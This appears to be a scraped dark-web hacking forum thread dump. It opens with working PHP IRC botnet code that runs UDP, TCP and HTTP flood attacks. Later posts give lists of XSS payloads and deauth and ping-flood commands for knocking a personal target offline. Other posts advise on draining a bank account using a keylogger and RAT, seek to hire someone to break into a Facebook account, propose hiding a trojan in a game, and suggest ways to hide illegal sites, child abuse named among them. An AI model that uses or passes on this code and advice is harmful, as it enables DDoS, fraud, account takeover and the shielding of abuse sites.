    }         if (eregi("ddos-udp",$read)) {            fputs($openSocket,"privmsg $Channel :ddos-udp - started udp flood - $read2[4]\n\n");     $fp = fsockopen("udp://$read2[4]", 500, $errno, $errstr, 30);     if (!$fp)     {     //echo "$errstr ($errno)<br>\n"; //troep     exit;     }     else     {     $char = "a";     for($a = 0; $a < 9999999999999; $a++)      $data = $data.$char;      if(fputs ($fp, $data) )      fputs($openSocket,"privmsg $Channel :udp-ddos - packets sended.\n\n");     else      fputs($openSocket,"privmsg $Channel :udp-ddos - <error> sending packets.\n\n");     }       }        if (eregi("ddos-tcp",$read)) {            fputs($openSocket,"part $read2[4]\n");     fputs($openSocket,"privmsg $Channel :tcp-ddos - flood $read2[4]:$read2[5] with $read2[6] sockets.\n\n");     $server = $read2[4];     $Port = $read2[5];      for($sockets = 0; $sockets < $read2[6]; $sockets++)     {     $openSocket = fsockopen($server, $Port);     }       }        if (eregi("ddos-http",$read)) {            fputs($openSocket,"part $read2[4]\n");     fputs($openSocket,"privmsg $Channel :ddos-http - http://$read2[4]:$read2[5] $read2[6] times\n\n");     $Webserver = $read2[4];     $Port = $read2[5];      $Request = "GET / HTTP/1.1\r\n";     $Request .= "Accept: */*\r\n";     $Request .= "Accept-Language: nl\r\n";     $Request .= "Accept-Encoding: gzip, deflate\r\n";     $Request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";     $Request .= "Host: $read2[4]\r\n";     $Request .= "Connection: Keep-Alive\r\n\r\n";      for($Number = 0; $Number < $read2[6]; $Number++)     {     $DoS = fsockopen($Webserver, $Port);     fwrite($DoS, $Request);     fclose($DoS);     }       }       $loop++;     }    ?>
It's a bot, with a UDP/TCP flood function.
Seems to be a very simple IRC bot. It is written in PHP, so it will probably run from a (hacked) webserver somewhere. It joins your channel and sits there waiting for commands. If it has ops it can give other people ops. It also has a UDP and TCP flooding function, which can be used to attack other hosts. If you found this bot pointing to your channel, that probably means someone is controlling the bot(s) from your channel. Not necessarily that they are attacking you. 
Ok thanks everyone. Pastebin is actually pretty cool. Lol When I went to new posts the first thing i saw was 10K hacked bank accounts. Crazy stuff.
Darn, everybody already beet me to this, oh well I will comment next time!
Thats a pretty succint little irc bot, ugly code but suprisingly compact for the functions it contains..
Hello, this might be a "stupid" post, but for a week ago or something i came across a thread. In this thread there was linked a book for beginner hackers/programmes. If anyone could find it again i would be happy.- Thanks!
There are many... Any specifics?..
A couple of books here:For browser hacking and mechanics: "The Browser Hacker's Handbook", "Hacking Exposed", etc.For hacking other computers or programs: "Hacking: The Art of Exploitation", etc.You can go look at the TOR library for more books under the software section.For other things like learning how to create viruses, backdoors, and what not you need to learn how to program in C++, Java (optional), php, JavaScript, HTML,and python (I would also recommend Perl or Ruby).
Thank you Indigo!The book i was looking for was "Hacking: The Art of Exploitation"
Please take note that this book is mainly about 32 bit systems, while most of the systems today are actually 64 bits, so some of the attacks won't work.
@the3coderTrue, but what I like about it is that it teaches you how to find your own vulnerabilities :).@leikny22You can find that book in the TOR library, however the second edition I can't find there ;(
I know this is (vaguely) off topic but if you want programming books to become a pro... There is a clearnet site that has a torrent for thirty-five gigs of books from information theory to mathematics. All relevant to programming. All useful. The site is called: http://books.gentoomen.org/ 
That's an awesome place.
Hey all, I've recently become very interested in XSS, and I just had a few questions/comments, because I'm kinda new in this field.Is XSS one of the most popular ways people hack websites nowadays?What coding language would be particularly good to learn for learning how to do more complex XSS script?Here are some I picked up:    "><script>alert("XSS")</script>    "><script>alert(String.fromCharCode(88,83,83))</script>    '><script>alert("XSS")</script>    '><script>alert(String.fromCharCode(88,83,83))</script>    <ScRIPt>aLeRT("XSS")</ScRIPt>    <ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>    "><ScRIPt>aLeRT("XSS")</ScRIPt>    "><ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>    '><ScRIPt>aLeRT("XSS")</ScRIPt>    '><ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>    </script><script>alert("XSS")</script>    </script><script>alert(String.fromCharCode(88,83,83))</script>    "/><script>alert("XSS")</script>    "/><script>alert(String.fromCharCode(88,83,83))</script>    '/><script>alert("XSS")</script>    '/><script>alert(String.fromCharCode(88,83,83))</script>    </SCRIPT>"><SCRIPT>alert("XSS")</SCRIPT>    </SCRIPT>"><SCRIPT>alert(String.fromCharCode(88,83,83))    </SCRIPT>">"><SCRIPT>alert("XSS")</SCRIPT>    </SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>    ";alert("XSS");"    ";alert(String.fromCharCode(88,83,83));"    ';alert("XSS");'    ';alert(String.fromCharCode(88,83,83));'    ";alert("XSS")    ";alert(String.fromCharCode(88,83,83))    ';alert("XSS")    ';alert(String.fromCharCode(88,83,83))Does anyone else know more complicated ones?Thanks,DigitalCombat
I'm interested in learning XSS too, any good books or resources on getting started? I prefer something based around python as it is the only programming language I know how to use.
Definitely a good book to learn more XSS techniques, such as DOM XSS, and XSS worms is the "BROWSER HACKER'S HANDBOOK", Has an entire section dedicated to all XSS vulnerabilities and exploits. It even teaches you how to find your own XSS exploits.Javascript is what you need to learn through and through if you want to learn how to XSS effectively.You can also encode the XSS code in Hexadecimal, DROW, and in many other ways rather than simple using alert(eval(String.fromCharCode(56,67,45))).By the way, I recommend instead of just using String.fromCharCode you also put the "eval" tag before it so the browser knows to actually evaluate it.
You should learn Javascript, thats what you are using when you XSS. 
browser hacker's handbook links, anyone ??
The Browser Hacker's HandbookHave fun 
Im gonna bring the roof down with this !!!
Hi there, Locke speaking, i'm currently creating a small game. If you can't tell by the title of the post it's the most famous text-based game: Zork. Now, who wants to do a dumb video game. I know, I know, but the catch is: I want to input a virus on it. i've thought about doing a trojan but i've no experience with blackhat hacking. If interested contact me at Locke_FPE@mail2tor.comBasic knowledge of C or C++ is needed.
You could bind a Dark Comet onto it O__o
Could easily be prepped into the main game files than executed at a certain point of the game onto the Local system.
Zork isn't all that popular, your spin-off of it will be even less popular.
 
Ohh those were fun.. Unfortunately I don't remember any of my old silly things, but I'll share in the nostalgia! :D
Why pause when you can loop?@echo off:trolololecho "[insert crap talk]"start "" %0goto trololol
Just a lil' thought from tinfoil hat land: imagine that someone that still remembers being pranked by that [edited] file happens to read this...
:O!Just kidding. I'm not to worried about it. I doubt they will care, since the 'virus' was practically harmless. Just restart the computer![Trust me, I accidentally launched it on myself when I was younger :)]
I meant that it can be used to identify you.
I do see the logic in that, I've edited just in case.Thanks for the concern, although I wouldn't think it likely they could EASILY find that based on such information. However, I do appreciate it :).
Hi, I am offering a small job for a hacker. For now I just need a price estimation, the job itself would take place in few weeks.The job would be to hack target's facebook account. However, I don't need access to it. Instead, I would like you to retrieve target's messages and send them to me (any format is fine). Target has probably SMS login notification turned on, so there won't be much time once you get in.Since escrow is mostly unusable for these things, I suggest something like "half before, half after" deal. You also wouldn't have to send me the whole thing to get the second half, since I know about *few* messages, you could answer few questions like "what did the target send to user xxxx on 01/01/2014 at 3:14 pm", to verify you have the data, then I would pay the other half and you would send me the data. (Just a suggestion of my currently best idea of how to do this, but I am open for discussion).
Why the fuck are these jobs ALWAYS in the software section?Please put this in Valuta Exchange instead./thread
I believe they put it in this section because hacking is related to software and programming kind off.
Where can I contact you, I can probably do this depending on the FB user
Yeah.... sorry bro... this forum isn't really for advertisement/hiring...
I have recently aquired a User/Pass for a bank account, but I need some help. This is a list of what I have:-Keylogger installed on the computer-Partial RAT admin control-Their email-Their bank accountSo my question is: How is it possible to find what their security question is? Any suggestions?Also, how could one transfer that bank account money to bitcoins?
Well, if you have a keylogger and a partial RAT you should just be able to just look for unusual text.You would usually see what looks like a username and a password followed by a security question. The other way of finding out their security question would be social engineering.You can use a money transfer system (there are many out there, especially for passing on crypto currency to another) for transferring money to BTC. However, I would exercise caution. Is this your first time doing this kind of thing? Also are you okay with being labeled as a criminal?Just saying, but it's your life, not mine.
Hello everyone,my name is Ramon and I'm a total rookie (you could notice in the topic title).I want to hack to learn, and I would like to practice with some people that is annoying me a lot. I'm an activist and I suffer lots of pressure and threats from people that bothers my "job", so, I want to learn how to counter-attack and defend myself.Basically, I want to start on how can I shut down someone internet. Simple as that. Is the best and easy way to flood it's IP with something like LOIC? I already tried, but LOIC doesn't seem to work, in UDP mode and with 2 threads my PC becomes slow and the victim dooesn't even feel it (I tried with my cousin's internet).I read that the problem with flood an IP is that you need a higher upload speed than the victim's download speed, so the "best" way to flood an IP is to use a paid booter (like IPstresser).I'm open to any idea. I would like to start with something simple and accurate, but of course, I don't know a shit about this, and common forums and communities don't give a fuck to help me with this, I hope same thing doesn't happen here.Thanks a lot for your time and pacience.
Yes, you can shutdown someones connection on a wifi network via de-auth requests listed to a certain person's MAC address on that wifi network. Or you could packet flood the router with advertisements (this is to bypass the security) in order the cut the internet for the ENTIRE network. 
*EDIT Accidental double post, very unusual...
Thanks for your reply @Indigo1011I need to do it without being in the same WiFi network. You know what I mean?Can I packet flood the router with advertisements without being in that WiFi network?Thanks.
Yes, you can launch a packet flooding attack against an external wifi router via advertisement packets or just useless garble packets. A great program to run is Aircrack-ng, which will allow you to flood routers with packets via Aireplay-ng.The command to launch a flood attack against a router on Aircrack would be:Aireplay-ng -O 0 -a (BSSID of router) wlan0 (or mon0 preferably)press enter and:SENDING DE-AUTH REQUESTS TO ***** ON CHANNEL **** 'n stuff ;).however, if you want to cut a connection to a single computer (or phone *cough* *cough*), you wouldn't need any programs. You could just simply launch a POD (Ping of Death) attack.This can be launched on all operating systems, however I don't know the ones for windows or mac since I'm running Linux (Debian).By the way, you can also launch a POD attack against bluetooth devices :). Launched it at a speaker once that had bluetooth, just had to detect the device first.Hope that helps.
Thanks again.POD is really common and in Windows it can be launched from "cmd" console. Problem is that is not good enough to shut down a connection. The command would be:ping 1111.111.1111.1111 -t -l 65000But that only causes high ping (latency, lag).AirCrack-NG is just for Wireless connections? I mean, I have to receive signal from the network I want to attack.What if I want to flood or attack an address IP? Being far from there obviously.
Hmmm... If you want to IP address directly over the internet you would need to perform a DOS or DDOS attack directed at that IP. However, for a DDOS you would need a botnet, which requires many slave computers to launch the attack for you, it's also practically untraceable unless you brag about it. Unfortunately, I don't really know any good techniques to DOSing manually, I only DDOS if I really want some shut down. IP addresses aren't the things you really need to attack a machine. You would need more information in order to attack a user like that directly.The IP will only serve to give you more information, or a gateway for a POD attack. Now, if you get the mac address of that machine who's IP you have, then some serious damage could be done, but just as a reminder, IP's aren't very useful for many attacks, only to get information on the target. Aircrack-ng is only for wireless attacks, however if you have the BSSID of the wifi you want to target, then it shouldn't be a problem.You can also exploit router's and HOP router to router from where you want to go.
Sorry I'm a bit lost, I'm a rookie.What do I should do if I want to attack someones internet (shut down internet) with just the IP address? You mentioned DDOS, but as I said before, I would need a huge upload speed to be available to do it.Thanks for your time man, I really appreciate it.
(Caution) Twitter link:pic.twitter.com/OaHJyUJyReHas anyone had a chance to look into how the probe request MAC address radomization occurs, and does it affect only certain interfaces like[WiFi] or does it extend to [Bluetooth] as well?Any reverse engineering using similar technique(s), for other operating systems[Android, etc..];-)
I kind of get the idea behind this feature but how will we be able to block network access by MAC address if it keeps changing?
Ah, iOS. The OS that really got me interested in hacking/coding. Are there any iso files of iOS 8 out yet? I would love to look into this.
So I was wondering if anyone knows any other methods of bypassing the Same Origin Policy on the internet gain control of a web page. The only method I know at the moment is to register a malicious webpage (a.k.a attacker webpage) on the same domain to add it as an extension of the website you want to attack, then you just wait for someone to click on it. For instance, if the webpage one would want to attack was www.example.com/index.html, I could just create the webpage www.example.com/hook.js and register that under the same domain to phish with or have someone navigate to?If anyone knows any other methods I would love to hear them.
 
Yes, very dangerous!On one hand you'd be betraying the trust of your customers, which I would never do.On the other hand, if a few of them have created email addresses exclusively for providing to your travel agency, it'll only be a matter of time until they figure out where that spam is coming from and expose you.My recommendation: don't do it. If you really need to get those "small services", get a list of emails from somewhere else.
Yes, you're right I thinks I will stop this and try another way to have some service...
To explain what Zyx just said... I do this! I own my own domain name and have a catch-all that goes to my only email box.. So, every time I ever give out an email address on any website, email, or in person, I choose a descriptive email name @ my domain. For example, yensid17614@mydomain.com might have been a good one to use on Disney.com today (the 176th day of 2014). So, if I ever get spam, I know where and when it originated. I don't use that specific pattern, but you get the idea.
Wow, that's a good method, but most of my customers are old people, so I think very few people use a similar method.And I just give email, I'm not phishing and I don't want to steal money (even if I take part :p)But you're still right, I'll try to catch mail by another procedure.
To the law it is the same, you are in the trick to steal money.... Anyway money your customers lose, you might lose it too in travel sales so you might lose income... Doing this is the same as shooting yourself in the foot.
DeadInfant I can get you email lists, just provide a way to contact you if you'd like to discuss
Is it possible for someone to read my text messages, or access my FB, snapchat etc, through phone? I mean, is there any 'spy' software, even installed previously on my cell-phone, that allows to see things like that? If yes, how to get rid of this?OR...Can administrator of wireless network see what am I sending, and what am I receiving? I don't mean TOR browser now, but standard websites and apps.Thank you for your help
Yes. Most companies (and I think all mobile phone companies) log text messages in their own system, which can be subject to subpoenas from law enforcement or the courts. They do this to cover their ass and will quickly rat you out if you are using their services for illegal purposes. It is usually only the direct service, though. The phone company is not logging information that you have sent to Facebook, for example, only Facebook keeps that information (forever and ever... even if you delete it, it is just setting the visibility to off somewhere in the database, but the original text is still there).The good news is that unless you are a target from the Feds, nobody is probably spying on you. They get way too many messages to ever waste time trying to find something illegal themselves, or even just a cheap thrill. They could honestly care less what you do on their systems as long as it does not come back to bite them in the ass. But, if you are a terrorist or pedophile, you would be a complete idiot to ever communicate through these types of systems unless it is PGP encrypted at each end (so messages are encrypted on their servers by you and they cannot decrypt them without the private key and passphrase).Last comment. Even if you visit a site in SSL (https://), spies/feds can still sniff the header information, IP and URL in plain text. So going to https://pedochat.com/underage is a dead giveaway even if the actual content of the webpage chat is encrypted. There is also a good possibility it is a trap or setup from law enforcement and all information is being logged on the server in plain text (SSL only encrypts data sent through the internet, not the data stored on the server). Using TOR or other anonymous proxies can fix that little problem, though, as long as you never use personally identifying information. But... if you are going to be into illegal shit, stick with the ".onion" addresses in Tor ONLY... AND never use personally identifying information.
Ok, thank you very much @blasfem I have one more question: Can WI-FI administrator see what am I sendig and what downloading?
No, the traffic between you and the Tor Entry Node is encrypted. If you're talking about clearnet traffic, it is only encrypted when you are using SSL. 
Ok, thank you :)
@PARTYKUS2: You are welcome. This is valuable information for everyone new to privacy and secrecy. It is amazing how many people are sharing every detail of their lives on Facebook without realizing everything uploaded to them they now own. Keep your life to yourself. If you use Facebook, think twice about every post or image you think about making available to so-called friends... they could turn around and make it public.
Thanks for advice :)I'm opponent to websites like Facebook and many others like this, myself. It's scary how much people can see what you upload... I think that users should be more careful. Even here, on DeepNet, some of us act careless..
Apparently a new (or old) method if hacking is just to take the public profile nod other pics of anyone and create a new account under the same name and start inviting your friends... They essentially become you and can get all the private friends only info and can say anything as if it was you.It doesn't make sense to me, though, because there would be two accounts shown for that one person then. Dunno. Just thought I'd tell you what I heard.
And that's why it's good to keep any friends list limited only to those you know from RL. I've seen such duplicate accounts before, but since I'm well aware of who's already in my list, I investigate them quickly through methods other than the same site (e.g. a phone call). Most of the time, it's someone that lost access to their old accounts, but I've had to publish info about fake accounts a few times as well.Back to the topic of this thread: be wary of free and open wifi networks. Most of the time, they are there with the explicit purpose of monitoring/phishing. All it takes is a network monitor and some average computer knowledge for someone to see everything you do through their network.
Imagine a scenario like this:Someone wants to host an illegal website on the clearnet (for example, in the US, this could be a child porn website; or in North Korea, almost anything...)The host doesn't want the IPs/identity of the site's visitors to be found outHow does someone protect the host and visitors?  I'd love an overview of multiple strategies if possible.  More than just ssl.
Well host an hidden service.... This way the server is protected but users are also protected...
Hosting stuff on TOR can be exploited easily to find your whereabouts.. At least use a VPN.
I did post this in the current events section but thought it applied here also. With the news about These Lois Lerner IRS emails tht have so called "disappeared" after her hard drive crashed, I was wondering if they could really not be recovered. Not from the hard drive but from the internet itself. These emails were sent over normal servers,if I am correct, so wouldn't they be somewhere in the internet system, or would they be lost?
Please keep it only in one section.
I came across this text file in my Downloads folder today, can't remember the source but some may find this interesting. ===================================================================================The Internet Kill Switch; With Global Wiretapping Capability?One company to rule them all One company to find them;One company to bring them all And in the darkness bind them Recently run any whois queries on Google? No? How about Facebook?  MSN, or Hotmail? Yahoo? You might be surprised, comparing the  results.  Nice, innit? See the "Last Updated" part also.  The  brand-protecting, anti-piracy company MarkMonitor Inc. has had all  these DNS names under its control for several months now.  They  also control the Wikimedia name services, even though that doesn't  show up on the Wikimedia.org whois record. There are many others.  Apple.com falls under their jurisdiction, as does ubuntu.com.  Nokia.com? Yep, under MarkMonitor. See a pattern here?   MarkMonitor also is a trusted Certificate Authority; they have, in  essence, the means to fabricate safe-looking SSL connections for  you, to whichever host they want. Your browser will not sound any  warnings of possible man-in-the-middle attacks.  MarkMonitor is a  company that can own most people's "Internet" in minutes. It now  controls all three top free e-mail providers directly, and I  suppose it's safe to say, most currently active social media sites  too.  See for yourself. Whois yahoo.com, whois google.com, whois  gmail.com, whois facebook.com, whois fbcdn.com, whois hotmail.com,  whois msn.com... the list seems endless.How'd all this happen?This company has acquired complete access to monitor, eavesdrop, censor and fake any user of these popular Internet services in about one year (2011). In almost complete silence. For several of the sites, it also provides "firewall proxy" services, which means it is actually paid to intercept all communications. In and out.  The situation reminds me of Joseph Lieberman's 2010 initiative to create an "Internet kill switch" for the U.S.  The government only needs to control this one company, and most social media, most free e-mail, most search engines will be under its control. Not to mention most operating systems, for both computers and mobile devices.  Not only inside U.S., but globally. One company to rule them all.  I, for one, would like to ask; WTF is going on? How did these guys, this relatively small domain-hogging and pirate-chasing company, get the resources to simply acquire the DNS records of all the most popular Internet services? How can this be so totally ignored by the media, and even privacy advocates? Even conspiracy theorists seem to be completely ignoring the situation. Secure communication is an illusionOnly one company to rule them all? As if all this doesn't sound bad enough, the problem is far more widespread. MarkMonitor could easily act as a global "kill switch" for the sites under its rule. But as it turns out, most anyone with some resources could just as easily impersonate MarkMonitor itself.  Because, as one might have noticed in the past few months, the whole SSL certificate scheme is broken. Not in a technical sense - there's no known inherent weakness in the algorithms. But the whole SSL protection is based on trust, and that trust has failed us.  According to several sources, SSL CA certs are routinely given out to anyone willing to pay for them. As The Register points out in its analysis on TrustWave spying scandal:"Those defending Trustwave suggested that other vendors probably usedthe same approach for so-called "data loss prevention" environments -systems that inspect information flowing through a network to preventleaks of commercially sensitive data."..."In fact Geotrust was openly advertising a 'Georoot' product on theirwebsite until fairly recently."http://www.theregister.co.uk/2012/02/14/trustwave_analysis/ Oh, so the ability to impersonate anyone is normal day-to-day  practise for big business? Just imagine what government agencies  must be doing - for example in Sweden, where the military  intelligence organisation FRA has the mandate to monitor all  traffic across borders.  Who can seriously claim they trust all  the hundreds of different CA companies, several of which have been  caught red-handed with selling out their customers' security, or  covering up very serious breeches (up to and including their root  certificates being stolen).   http://nakedsecurity.sophos.com/2011/04/06/eff-uncovers-further-evid ence-of-ssl-ca-bad-behavior/ MarkMonitor is a "brand-protecting" company. Traditionally its  business has been reserving domains to protect brands. You buy its  service, it makes sure that nobody else can have  "mybrandsucks.com".  Also, they're an anti-piracy outfit. Their  entire business is based on protecting IP.   http://www.marketwatch.com/story/markmonitor-to-exhibit-at-internet- tech-policy-exhibition-and-reception-to-be-held-on-capitol-hill-2012 -01-24 Just saying, someone should probably question them and their  customers. Why does Google, who always "do things themselves",  externalise these vital parts of its network? How come all the  competing phone and OS vendors, who sue each other all the time,  suddenly trust this one company?  And then there's all those  competing social media companies, who practically thrive on what  others call "IP theft", including their users sharing text,  images, music, videos and links?Big questions. Defy common sense. Need answers.
Wow,this scares me like a cybernout 
For fucks sake..
Oh my this is scary
We need to make this happen. Soon...
Its more of a coersion effort then anything because, no one has experienced security so, "protecting" anything is a mythical play-on-words. IP doesn't exist because, the information is received before it is ever repeated so, there isn't an actual, 'who" thought of(received information) "what" first.
As possible as that is now through my Quantum Soul Theory and it's new extensions, let's try to stick to terms everyone can understand, Korruptor.
They're also a part of Thomson Reuters 
I know that every time I use Tor my IP adress changes with another one,but I have a question does any of these IP's belong to a real person or are they fake IP's.
They are exit nodes with real IP addresses that someone is willingly hosting. You are even able to host your own exit node if you wish. Any ".onion" addresses are entirely cloaked within the Tor network, but any clearnet address CAN be tracked to the exit node. And if you are not on secure SSL site (https://), an exit node could snoop on data you send and receive.Here is a great view and explanation of the exit nodes... http://hackertarget.com/tor-exit-node-visualization/Fake IP's are not possible because there would be no way to route the traffic to your computer.

woah thats a list. thx i will be playing around with these on my garbage pc
passive monitoring using honeypots. Receiving instead of transmitting:https://threatstream.github.io/mhn/
I recently read an article about someone changing some files in /boot of an Ubuntu install in order to gain a user's encryption passphrase. The computer had full disk encryption and required a passphrase to unlock the encryption keys in order for the OS to boot. Basically, the attacker printed the cleartext passphrase to a file and then transmitted the file to the attacker's computer. The attacker needed physical access to the computer, and it only took about 10 minutes with the computer in order to prepare it. After that, the attacker just had to wait for the user to boot up their computer and enter their passphrase.I know a way to help counter such an attack, but I'm interested in a way to determine if/when this type of attack has occurred. My thought is to boot from a USB stick and then check to see if /boot has been modified. I think simply checking the hash of this directory against a known good /boot directory would be enough, but I'm not sure how practical this is. I know that some updates can change files in /boot, but I'm not sure how often that would occur.There are a few reasons why I think it would be beneficial to know when this type of attack has occurred. The obvious reason is so that you will know that your system has been compromised. Another reason is that once you know something has been modified, you could see exactly what has been modified. Depending on what part has been compromised, you could then possibly use this as a means of disseminating disinformation.Does my idea seem like it might work? If so, does anyone know how to implement my idea or where I could look for more information? If not, what other ideas do you think might work?
https://wiki.archlinux.org/index.php/Dm-crypt/Specialties#Securing_the_unencrypted_boot_partitionBasically put, one option is to put your /boot on an external drive entirely. The other option is to run chkboot to verify the integrity of /boot after booting. From the wiki:Warning: chkboot makes a /boot partition tamper-evident, not tamper-proof. By the time the chkboot script is run, you have already typed your password into a potentially compromised boot loader, kernel, or initrd. If your system fails the chkboot integrity test, no assumptions can be made about the security of your data.
Thanks for the info. Just knowing that /boot has been changed is good enough for me, though only knowing after I type in my passphrase is not enough. I'll have to look at exactly what chkboot does and see if I could do the same thing from a bootable USB.Now I'm thinking the best I can do it boot to a USB in order to check /boot on my computer. Then once everything checks out I can boot from my computer. I'm still not sure exactly how to determine whether the system has legitimately changed /boot or if someone has made malicious changes. From this post (https://ubuntuforums.org/archive/index.php/t-2011133.html), it looks like simply changing the times stamp on a file will cause chkroot to throw up a warning.
Systems that have secure boot enabled would throw warnings all the time if updates changed /boot a lot. I'm still waiting for updates to this, but I think it's safe to assume that any change to that directory that you didn't do yourself means the system has been compromised.
Have a look at the inotify-tools package, you can easily write a script that alerts you when files in /boot are changed...
I am trying to make a private chat program that encrypts your messages and can be runned on or off tor. I have the crypting code done i just want to know the best language to continue the software on. Also how could i make my own form of math.random() i don't want to use the defult one and also i want portablity to other languages. Thanks :)
If it's a webchat system, just remember that it's unlikely for users to enable JS in their browsers, so don't rely on it. For the server side, you can pick basically anything you're good at, though I'd suggest a common, easy to read one that many are likely to have installed already (e.g. PHP). If it's standalone software, same as for the webchat server-side, but make sure it's easy to compile (many will want to do that themselves, after reviewing the code).This goes without saying, but it must be open source.
ok thx for the advice. I would like to give a estimate on when it might be done but i don't know. What i want to do is create a fast but secure way to chat with others.
If you are using your own DNS to route chat traffic (I assume its not as simple as just an IRC client), I would probaby suggest import the code that you've already got in the transport layer, then use PHP to do the rest of the web integration. I say this because PHP does not have APIs in the tor browser (unless you wish to plant caches) in the same way JS does, meaning if you wish to use the tor browser for your setup it can run the script in the HTML vertual interface without a hitch. I know this isnt really in depth, but i hope it helps. 
I will consider this. I have to do some learning but eventually i will get something.
Hi anyone have a darknet crawler, want to search for level 11!I have a botnet so I might be able to get it done a bit faster then most :D. 
Darknet Crawler?The whole point of Darknet is that is is not indexed, hence cannot be crawled.And Level 11 doesn't exist. Deepest level/layer known to possibly exist is Level 7/8 (Marians/Deadnet).You would never get access to it. In fact, neither will I.The only person who would probably come close is Aiden Pierce fom Watch Dogs, but that's just fiction.Only a very very small handful of the world's population have even got close. Even less have actually got to Level 8. Those who have got to it, usually have "gone missing" shortly afterwards.
I meant Marinas, not Marians. My bad.
@nobody_here_01(Whom I am starting to think is a old friend....)The deepest I have ever heard is level 10,ware did you here about level 11?All you would really need to crawl the deep web would be a software capable of accessing all the dark-nets,and for the address just look at them there is little rhythm or reason to it all you would need is a BIG rainbow table...Just my thoughts...Sincerely,Gunner Zodiac Russtle@xorcistMost of them wind up burned some ware,or the go off the grid...Sincerely,Gunner Zodiac Russtle
I don't know if you're already aware of it, but Harry71 over on Galaxy has one. You can check out the results at skunksworkedp2cg.onion . I'm also working on my scripting, trying to learn how to do the same thing. Just curious, since Tor was originally a naval network, if there are any government sites still out there.Lex
[incomplete]I propose to create a P2P hosting system. A server, where your content is distributed into the network and served from multiple peers. This would enable content to remain online, even if the source is raided, because the data was never restricted to a physical server. In theory, this would also enable capability to withstand DDoS and other network resource overloading attacks. Also, it would inherently achieve Tor's hidden service functionality on a first level, and can be extended to create a full onion network.Join the #IEZone channel through any onion IRC server to discuss ideas for it right now! Current participants: 6 users.Proposed languages for implementation:- Scheme (full language extensibility)- Node.js (high I/O throughput & easy to use NPM)- C++ (Node.js uses Google's V8 engine, a potential risk)- D
Isn't it like Freenet actually doing... ?
Pretty much, that's the inspiration. Just add the capability of running server-side code in a secure manner for both the author and the local admin, and you extend it's site hosting capabilities to full websites. We will add the Freenet common platform model + onion routing (that's already in Freenet, just pointing out) + hosting full websites (Freenet supports only static content like HTML).Haven't written more because I still want to run it by another couple of programmers through the chat. I think we've already figured it out, but only through Node.js, not sure if C++ would allow securing it from both sides. In other words, we're trying to get it to compete not only with the deep web platforms, but also servers such as Apache  and others.
Actually I think that it'll be more a PITA to host dynamic content... a MySQL db can be compromised and a shitload of work to get this updated especially big ones like I use that add arround 500mb of data, sometimes more, everyday.You should get a .onion up and disclose details and technical stuff...
It'll definitely be a pain in the ass, but we're slowly working it out at the #IEZone IRC channel, we're there most of the time.EDIT: We're willing to take it as low level as needed, so if we can't work with MySQL, we'll use another DB or build our own.
Hey, this sounds neat. I'd love to be a part of it. ;)
Mmm I have had this idea myself but also TPB have.https://torrentfreak.com/how-the-pirate-bay-plans-to-beat-censorship-for-good-140105/Not sure how far they are with it but really I think it's ideal in their case. The peers can host all the data there is nothing sensitive, could probably use PGP keys if you wanted some user interaction to take place.
Thank you so much! I'm now digging up more about their project.I see that their approach is slightly different from my idea though. I want it to be able to execute server side processing, within random hosts, which will not even know what content they are hosting. The local resources contributed will be a certain minimum + resources matching the amount requested to host your content + anything you feel like donating. It'll have an option to donate your resources for a particular website, but it'll only reserve that space on some random host and store a random site on your machine.Also, they're using node.js, which uses Google's V8 engine...
I could help coding (C/C++) if you want. Lua seems to be a great scripting language, there many engines in C, C++, Java, JavaScript and many more languages, so that would be a good option. Concerning P2P: How do you know that data is originally from the server? Even more important, if a server is down, how do you know to which peer to connect? This is the main problem, as long this is not solved we can't/shouldn't create any servers because it would be just pointless. Also, what format should the data/requests have? Normal HTTP requests on a nonstandard port? A new protocol? Again, this is realizable, but certainly not easy to make and possibly not anonymous...
I'll help out.
@the3coder: Yep, we're still at that stage, that's why we haven't bothered with setting up an onion or updating this post too much. All of those questions and more have come up. For some of those questions, it could run an internal, de-centralized pseudo DNS, based on trust ratings. Join us on the #IEZone IRC channel on the OnionNet servers.
I know C/C++, and I can learn Scheme, either way's fine for me.I'd stay away from node.js.
Why not base it on onion routing/HTTP/HTML with a little scripting? Every document gets an id assigned, together with one or multiple hashes. A Client requests the document by a normal HTTP request with the id of the requested document (maybe also add titles?). The server returns to the client the content, who can verify that it is correct by calculating the hash. To get to know other servers with the same system you could introduce a special id to request, for example 0. Old content can be removed after some time if there are no new visitors. If the server does not have the document, he can redirect the client to another server and/or download the document himself from a peer.Problems of this system: Repeated submit DOS, unknown document requesting DOS, no modification of old content (how are you going to find a new/updated version and make sure it's legit?)
It will certainly include routing through Tor. Even if we develop our own routing system afterwards, the other darknets are too good to just ignore.Some of the stuff you mentions, like the resource management already had a prototype as exposed in previous posts, but more ideas are welcome. But remember, it needs to run anything you can do on any server (and more). Basically, we want anon VM VPS.
Hey, is this still going on? There's no one on IRC
You're in the wrong IRC then.Host: cfyfz6afpgfeirst.onionChannel: #IEZone
Uhm there are actually four people in the IRC right now...Edit: I see Zyx beat me to it :)
CONTEXT:*******I'm willing to group a DDOS attack against a not-so-popular website and I want know how much computers must be DDOSing the server at the same such that the server crashes.Question:********What information should I know about a particular server to know how much computers are required to crash it?Any help is much appreciated.Thanks in advance.
AFAIK, unless you find an actual exploit that would crash it, it will come back up as soon as the requests die down. After all, it's a Distributed Denial of Service attack, where you deny service to legitimate users, not crash the server itself.
Thanks @Zyx for your answer. But which type of exploit can made a server crash? Sorry if I'm still a newbie, if you have  a reference to read on those matters please share it with me. That would be extremely helpful. Thanks again.
You would need to gather information about that server and find out what it runs on. Then, you'd have to study it thoroughly. If it's running on Windows (very unlikely), that may be your easiest way in. If not, the application layer may be your next best bet (if the author sucks). You might find a way to gain access and fuck it up from the inside, or you might find something that would actually crash it. In any case, it would have to be tailored to that system. The good news is that if you find such an exploit (unlikely), you won't need to DDoS it at all.
How would i go about hosting my own .onion? Any help would be appreciated :)
Tor's documentation.
thx :)
I have been learning some of the langauges suggested in pervious posts to do with hacking, but I'm wondering where/how I start ??What am I meant to do in terms of putting this new found knowledge to use ??-DS
A good place to start is attempting to hack your own projects.
I figured that, but how would I do it ?? do I go through command prompt or what ??(yeah sorry, I am 100% a complete n00b)
